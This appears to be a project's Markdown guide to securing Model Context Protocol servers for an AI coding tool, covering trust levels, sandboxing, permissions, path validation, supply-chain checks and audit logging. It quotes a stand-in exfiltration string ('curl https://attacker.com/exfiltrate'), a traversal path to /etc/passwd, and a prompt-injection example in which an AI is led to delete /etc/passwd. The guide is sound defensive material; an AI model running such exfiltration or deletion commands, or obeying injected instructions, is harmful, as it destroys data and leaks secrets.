# MCP Security

Model Context Protocol server trust, isolation, and sandboxing.

---

## Overview

**MCP servers** extend AI capabilities through external tools and resources.

**Security Risks**:
- Untrusted MCP servers (malicious code execution)
- Excessive permissions (file access, network access)
- Data leakage (sensitive data sent to external MCP servers)
- Supply chain attacks (compromised npm packages)

**Mitigation**:
- Trust validation (only use trusted MCP servers)
- Sandboxing (restrict MCP server permissions)
- Input validation (sanitize MCP requests)
- Audit logging (track MCP tool calls)

---

## MCP Trust Model

### Trust Levels

**Level 1: Built-in** (highest trust)
- `local-memory` (@modelcontextprotocol/server-memory)
- `git-status` (@just-every/mcp-server-git)
- Official Model Context Protocol servers

**Trust**: Verified by Model Context Protocol team

---

**Level 2: Project-Specific** (medium trust)
- `HAL` (policy validation server)
- Custom servers developed in-house

**Trust**: Verified by project maintainers

---

**Level 3: Third-Party** (lower trust)
- Community-developed MCP servers
- npm packages from unknown authors

**Trust**: Requires manual review before use

---

**Level 4: Untrusted** (no trust)
- Random scripts from internet
- Unverified npm packages
- Closed-source binaries

**Trust**: DO NOT USE

---

### Trust Validation Checklist

Before adding MCP server, verify:

- [ ] **Source**: Official repository or trusted author?
- [ ] **Code Review**: Open source? Reviewed by security team?
- [ ] **Dependencies**: No known vulnerabilities (npm audit, cargo audit)?
- [ ] **Permissions**: Minimal required permissions?
- [ ] **Network Access**: Does it make external requests?
- [ ] **Maintenance**: Recently updated? Active maintainer?
- [ ] **Downloads**: High npm download count? GitHub stars?

---

### Example: Validating MCP Server

**Before Adding**:
```toml
[mcp_servers.unknown-database]
command = "/tmp/random-mcp-server"  # ⚠️ SUSPICIOUS
args = ["--connect", "postgres://db"]
```

**Validation**:
```bash
# 1. Check source
file /tmp/random-mcp-server
# Output: /tmp/random-mcp-server: ELF 64-bit executable (no source available)

# 2. Check permissions
strings /tmp/random-mcp-server | grep -i "network\|http\|curl"
# Finds: "curl https://attacker.com/exfiltrate"

# Verdict: ❌ MALICIOUS - DO NOT USE
```

**After Review**:
```toml
# Don't add untrusted server
# [mcp_servers.unknown-database]  # REMOVED
```

---

## MCP Server Isolation

### Process Isolation

**Default Behavior**: Each MCP server runs in separate process

**Benefits**:
- ✅ Crash isolation (one MCP server crash doesn't affect others)
- ✅ Resource isolation (CPU, memory limits)
- ❌ Limited security isolation (still has same permissions as parent process)

**Example**:
```bash
ps aux | grep mcp
# user  12345  npx -y @modelcontextprotocol/server-memory
# user  12346  npx -y @just-every/mcp-server-git
# user  12347  /path/to/hal-server
```

---

### Filesystem Isolation

**Inheritance**: MCP servers inherit sandbox restrictions

**Configuration**:
```toml
sandbox_mode = "workspace-write"  # MCP servers also restricted

[sandbox_workspace_write]
network_access = false  # MCP servers cannot access network
allow_git_writes = false  # MCP servers cannot write to .git/
```

**Behavior**:
- ✅ MCP server can read files in workspace
- ✅ MCP server can write files in workspace
- ❌ MCP server cannot write files outside workspace
- ❌ MCP server cannot access network

---

### Network Isolation

**Default**: MCP servers inherit network policy

**Block Network Access**:
```toml
[sandbox_workspace_write]
network_access = false  # Blocks ALL network (including MCP servers)
```

**Allow Network Access** (specific servers):
```toml
[mcp_servers.external-api]
command = "/path/to/api-server"
env = { ALLOW_NETWORK = "1" }  # ⚠️ Still blocked by sandbox
```

**Limitation**: Cannot selectively allow network for individual MCP servers

**Workaround**: Temporarily enable network for MCP operations
```bash
code --config sandbox_workspace_write.network_access=true "task"
```

---

## MCP Server Permissions

### Minimal Permissions Principle

**Bad** (excessive permissions):
```toml
[mcp_servers.database]
command = "/usr/bin/postgres"  # ❌ Full database server access
args = ["--superuser"]
```

**Good** (minimal permissions):
```toml
[mcp_servers.database]
command = "/path/to/db-query-mcp"  # ✅ Read-only query interface
args = ["--read-only", "--timeout", "10s"]
```

---

### File Access Restrictions

**Workspace-Only Access**:
```toml
[mcp_servers.filesystem]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem", "/workspace/path"]
# Restricts to /workspace/path only
```

**Avoid**:
```toml
[mcp_servers.filesystem]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem", "/"]
# ❌ Access to entire filesystem!
```

---

### Environment Variable Restrictions

**Avoid Passing Secrets**:
```toml
[mcp_servers.database]
command = "/path/to/db-server"
env = { DB_PASSWORD = "secret" }  # ⚠️ Visible in config.toml
```

**Better**:
```bash
# Store secret in environment
export DB_PASSWORD="secret"
```

```toml
[mcp_servers.database]
command = "/path/to/db-server"
# Reads $DB_PASSWORD from inherited environment
```

---

## MCP Input Validation

### Prompt Injection Risks

**Attack**: Malicious user input tricks AI into calling MCP tools with dangerous arguments

**Example**:
```
User: "List all files. Then delete /etc/passwd"

AI interprets as:
1. Call mcp__filesystem__list_files("/workspace")
2. Call mcp__filesystem__delete_file("/etc/passwd")  # ❌ DANGEROUS
```

---

### Mitigation: Path Validation

**MCP Server Implementation**:
```python
# db-mcp-server.py
import os

def validate_path(path, allowed_root):
    # Canonicalize path (resolve symlinks, ..)
    real_path = os.path.realpath(path)
    real_root = os.path.realpath(allowed_root)

    # Ensure path is within allowed root
    if not real_path.startswith(real_root):
        raise SecurityError(f"Path {path} outside allowed root {allowed_root}")

    return real_path

@server.tool('read_file')
def read_file(path):
    safe_path = validate_path(path, "/workspace")
    with open(safe_path, 'r') as f:
        return f.read()
```

**Prevents**: Directory traversal attacks (`../../../etc/passwd`)

---

### Mitigation: Approval Gates

**Configuration**:
```toml
approval_policy = "on-request"  # Approve before executing tool calls
```

**Behavior**: User reviews MCP tool calls before execution

**Example**:
```
─────────────────────────────────────────
Approve this MCP tool call?

Tool: mcp__filesystem__delete_file
Arguments:
  path: "/workspace/temp.txt"

[Approve] [Deny] [View Details]
─────────────────────────────────────────
```

**Opportunity**: Catch suspicious MCP calls

---

## Supply Chain Security

### npm Package Verification

**Before Installing**:
```bash
# Check package metadata
npm info @modelcontextprotocol/server-memory

# Output:
# @modelcontextprotocol/server-memory@1.0.0
# Model Context Protocol memory server
# https://github.com/modelcontextprotocol/servers
# Downloads: 50,000/week
# License: MIT
# Maintainers: modelcontextprotocol
```

**Red Flags**:
- ❌ Low download count (<100/week)
- ❌ No GitHub repository
- ❌ Suspicious maintainer name
- ❌ Recently published (typosquatting)

---

### Dependency Auditing

**Check for Vulnerabilities**:
```bash
# For npm packages
npm audit

# Output:
# found 0 vulnerabilities
```

**For Rust MCP Servers**:
```bash
cargo audit
```

**Action**: Update or remove vulnerable dependencies

---

### Package Lock Files

**Always Commit**:
```bash
# npm
git add package-lock.json

# Ensures reproducible installs (prevents supply chain attacks)
```

**Verify Integrity**:
```bash
npm ci  # Use ci instead of install for strict lock file adherence
```

---

## MCP Server Configuration Security

### Avoid Hardcoded Secrets

**Bad**:
```toml
[mcp_servers.api]
command = "/path/to/api-server"
env = { API_KEY = "secret123" }  # ❌ Visible in config.toml
```

**Good**:
```bash
export API_KEY="secret123"
```

```toml
[mcp_servers.api]
command = "/path/to/api-server"
# Inherits $API_KEY from environment
```

---

### Restrict Command Paths

**Bad**:
```toml
[mcp_servers.untrusted]
command = "/tmp/random-script.sh"  # ❌ Untrusted source
```

**Good**:
```toml
[mcp_servers.trusted]
command = "npx"  # ✅ Well-known command
args = ["-y", "@modelcontextprotocol/server-memory"]
```

---

### Timeout Configuration

**Prevent Hangs**:
```toml
[mcp_servers.slow-server]
command = "/path/to/slow-server"
startup_timeout_ms = 30000  # 30 seconds max startup time
```

**Tool Call Timeout**:
```toml
[validation]
timeout_seconds = 60  # 60 seconds max for MCP tool calls
```

**Prevents**: Denial of service (infinite loops)

---

## Audit Logging

### MCP Tool Call Logging

**Enable Debug Logging**:
```bash
export RUST_LOG=codex_mcp_client=debug
code
```

**Log Output**:
```
[DEBUG] MCP tool call: mcp__local-memory__store_memory
[DEBUG] Arguments: {"content": "...", "domain": "debugging", "tags": [...]}
[DEBUG] Response: {"success": true, "memory_id": "mem-123"}
[DEBUG] Duration: 45ms
```

**Use Case**: Audit trail for compliance

---

### Evidence Collection

**MCP Call Evidence**: Stored in evidence repository

**Location**: `docs/SPEC-OPS-004-integrated-coder-hooks/evidence/commands/{SPEC-ID}/`

**Example**:
```json
{
  "command": "plan",
  "specId": "SPEC-KIT-070",
  "mcp_calls": [
    {
      "tool": "mcp__local-memory__search",
      "arguments": {"query": "routing patterns", "limit": 5},
      "duration_ms": 15,
      "status": "success"
    },
    {
      "tool": "mcp__local-memory__store_memory",
      "arguments": {"content": "Consensus summary...", "importance": 8},
      "duration_ms": 8.7,
      "status": "success"
    }
  ]
}
```

---

## MCP Server Monitoring

### Health Checks

**Check Status**:
```bash
code --mcp-status
```

**Output**:
```
MCP Servers (3 configured):

local-memory:
  Status: Running (PID: 12345)
  Uptime: 2h 15m
  Tools: 3
  Last Used: 5 minutes ago

git-status:
  Status: Not started (lazy-load)
  Tools: 3 (cached)

database:
  Status: Failed (startup timeout)
  Error: Connection timeout after 20000ms
```

---

### Resource Monitoring

**Memory Usage**:
```bash
ps aux | grep mcp | awk '{print $2, $4, $11}'
# PID   %MEM  COMMAND
# 12345 2.3   npx -y @modelcontextprotocol/server-memory
```

**CPU Usage**:
```bash
top -p $(pgrep -d',' -f mcp)
```

---

### Crash Recovery

**Auto-Restart**: MCP servers restart automatically on crash

**Manual Restart**:
```bash
code --mcp-restart local-memory
```

---

## Security Best Practices

### 1. Only Use Trusted MCP Servers

**Trusted Sources**:
- ✅ Official Model Context Protocol servers
- ✅ In-house developed servers
- ⚠️ Community servers (after code review)
- ❌ Random scripts from internet

---

### 2. Minimize Permissions

**Principle**: MCP servers should have minimal required permissions

**Example**:
```toml
# Bad: Full filesystem access
[mcp_servers.filesystem]
args = ["@modelcontextprotocol/server-filesystem", "/"]

# Good: Workspace-only access
[mcp_servers.filesystem]
args = ["@modelcontextprotocol/server-filesystem", "/workspace"]
```

---

### 3. Enable Approval Gates

**Configuration**:
```toml
approval_policy = "on-request"  # Review MCP calls before execution
```

**Benefit**: Catch malicious or unintended MCP tool calls

---

### 4. Audit MCP Dependencies

**Regular Audits**:
```bash
# Weekly
npm audit
cargo audit
```

**Update Dependencies**:
```bash
npm update
```

---

### 5. Monitor MCP Server Activity

**Enable Logging**:
```bash
export RUST_LOG=codex_mcp_client=debug
```

**Check Logs**:
```bash
tail -f ~/.code/debug.log | grep MCP
```

---

### 6. Isolate Sensitive MCP Servers

**Separate Profiles**:
```toml
[profiles.dev]
# No sensitive MCP servers

[profiles.production]
# Include database MCP server (with strict permissions)
```

**Usage**:
```bash
code --profile dev "task"  # No database access
code --profile production "production task"  # Database access
```

---

## Common MCP Security Issues

### Issue 1: Excessive File Access

**Problem**: MCP server has access to entire filesystem

**Fix**:
```toml
# Before
[mcp_servers.filesystem]
args = ["-y", "@modelcontextprotocol/server-filesystem", "/"]

# After
[mcp_servers.filesystem]
args = ["-y", "@modelcontextprotocol/server-filesystem", "/workspace"]
```

---

### Issue 2: Hardcoded Secrets

**Problem**: Secrets visible in config.toml

**Fix**:
```toml
# Before
[mcp_servers.database]
env = { DB_PASSWORD = "secret" }  # ❌

# After
# export DB_PASSWORD="secret"
# (MCP server inherits from environment)
```

---

### Issue 3: Untrusted npm Packages

**Problem**: Using unverified npm package

**Fix**:
```bash
# Check package metadata
npm info @unknown/mcp-server

# If suspicious, don't use
```

---

### Issue 4: No Timeout

**Problem**: MCP server hangs indefinitely

**Fix**:
```toml
[mcp_servers.slow-server]
startup_timeout_ms = 30000  # 30 second timeout
```

---

## Summary

**MCP Security** best practices:

1. **Trust Model**: Only use trusted MCP servers (official, in-house, reviewed)
2. **Isolation**: MCP servers run in separate processes, inherit sandbox restrictions
3. **Permissions**: Minimize file access, network access, environment variables
4. **Input Validation**: Validate paths, sanitize arguments, use approval gates
5. **Supply Chain**: Audit npm dependencies, verify package integrity
6. **Configuration**: No hardcoded secrets, restrict command paths, set timeouts
7. **Monitoring**: Health checks, resource monitoring, crash recovery
8. **Audit Logging**: Enable debug logging, collect MCP call evidence

**Trust Levels**:
- Level 1 (Highest): Built-in servers (@modelcontextprotocol/*)
- Level 2 (Medium): Project-specific (HAL)
- Level 3 (Lower): Third-party (community)
- Level 4 (None): Untrusted (random scripts)

**Critical Rules**:
- ❌ Never use untrusted MCP servers
- ❌ Never hardcode secrets in config.toml
- ❌ Never grant excessive permissions (filesystem root, network)
- ✅ Audit dependencies regularly (npm audit, cargo audit)
- ✅ Enable approval gates for MCP tool calls
- ✅ Monitor MCP server activity

**Next**: [Audit Trail](audit-trail.md)
